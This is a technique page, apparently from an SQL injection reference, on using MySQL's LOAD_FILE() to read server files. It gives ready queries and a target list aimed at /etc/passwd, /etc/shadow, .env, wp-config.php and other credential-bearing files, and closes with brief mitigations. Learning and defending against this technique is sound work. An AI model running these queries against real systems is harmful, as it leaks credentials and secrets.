---
title: Reading Files
description: Techniques for reading files from the filesystem using MySQL
category: File Operations
order: 15
tags: ["file operations", "load_file", "privilege escalation"]
lastUpdated: 2025-03-15
---

## Reading Files

MySQL provides functionality to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### Prerequisites

To read files from the MySQL server, the following conditions must be met:

1. The MySQL user must have the `FILE` privilege
2. The file must be readable by the MySQL server process (usually `mysql` user)
3. You must know the absolute path to the file
4. The file size must be less than `max_allowed_packet` (default 1MB to 4MB)

### LOAD_FILE() Function

The primary method for reading files is the `LOAD_FILE()` function:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

This function returns the file contents as a string or NULL if the file doesn't exist or isn't readable.

### Checking for FILE Privilege

Before attempting to read files, check if the current user has the necessary privilege:

```sql
-- Option 1: Check directly in mysql.user table (requires additional privileges)
SELECT File_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1);

-- Option 2: Check through information_schema (more commonly accessible)
SELECT 1 FROM information_schema.user_privileges
WHERE grantee LIKE CONCAT("'", SUBSTRING_INDEX(USER(), '@', 1), "'@%")
AND privilege_type = 'FILE';
```

### Important Target Files

Common valuable files to read:

| File Path                            | Description                                |
| ------------------------------------ | ------------------------------------------ |
| `/etc/passwd`                        | System users list                          |
| `/etc/shadow`                        | Password hashes (rarely readable)          |
| `/etc/hosts`                         | Host mapping information                   |
| `/proc/self/environ`                 | Environment variables                      |
| `/etc/my.cnf` or `/etc/mysql/my.cnf` | MySQL configuration                        |
| `/var/lib/mysql-files/`              | MySQL secure file priv directory           |
| `/var/www/html/config.php`           | Web application configuration              |
| `/var/www/html/wp-config.php`        | WordPress configuration                    |
| `/var/www/html/.env`                 | Environment variables for web applications |
| `/home/user/.bash_history`           | Command history                            |
| `/var/log/apache2/access.log`        | Web server logs                            |
| `/var/log/mysql/error.log`           | MySQL error logs                           |

### Advanced Techniques

#### Reading Binary Files

Binary files can be read and converted to hexadecimal:

```sql
SELECT HEX(LOAD_FILE('/bin/ls'));
```

#### Determining Web Root Path

If you don't know the web server's document root:

```sql
-- Try common locations
SELECT LOAD_FILE('/var/www/html/index.php');
SELECT LOAD_FILE('/srv/www/index.php');
SELECT LOAD_FILE('/usr/share/nginx/html/index.php');

-- Or check configuration files
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');
```

#### Dealing with Known File Paths

If exact path is unknown, try multiple possible locations:

```sql
SELECT LOAD_FILE(CONCAT('/var/www/', 'config.php'));
SELECT LOAD_FILE(CONCAT('/var/www/html/', 'config.php'));
SELECT LOAD_FILE(CONCAT('/var/www/site/', 'config.php'));
```

### Practical Examples

#### Reading Database Configuration

```sql
-- Check for common configuration files
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/var/www/html/configuration.php');   -- Joomla
SELECT LOAD_FILE('/var/www/html/sites/default/settings.php');  -- Drupal
```

#### Reading System Information

```sql
-- Get /etc/passwd to identify users
SELECT LOAD_FILE('/etc/passwd');

-- Check MySQL configuration
SELECT LOAD_FILE('/etc/my.cnf');
```

### Mitigation

To prevent unauthorized file access:

1. Limit FILE privilege to trusted users only
2. Set `secure_file_priv` to restrict file operations to a specific directory
3. Use prepared statements in application code
4. Implement proper input validation
5. Run MySQL with minimum necessary privileges
